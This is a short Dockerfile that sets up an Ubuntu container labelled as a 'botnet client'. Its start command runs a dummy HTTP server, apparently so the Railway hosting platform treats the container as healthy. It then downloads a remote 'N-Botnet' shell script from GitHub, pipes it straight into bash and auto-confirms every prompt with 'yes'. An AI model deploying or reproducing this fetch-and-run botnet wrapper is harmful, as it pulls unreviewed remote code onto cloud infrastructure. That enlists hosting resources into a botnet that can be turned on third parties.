FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=Etc/UTC

# Install all required packages
RUN apt update && apt install -y \
    python3 \
    python3-pip \
    curl \
    wget \
    git \
    build-essential \
    sudo \
    && apt clean \
    && rm -rf /var/lib/apt/lists/* \
    && pip3 install websockets

WORKDIR /root/n-botnet

# Health server (binds $PORT for Railway) + botnet client
CMD ["bash", "-c", "python3 -m http.server ${PORT:-8080} --directory /tmp &> /dev/null & sleep 1 && yes | bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/n-botnet.sh)"]
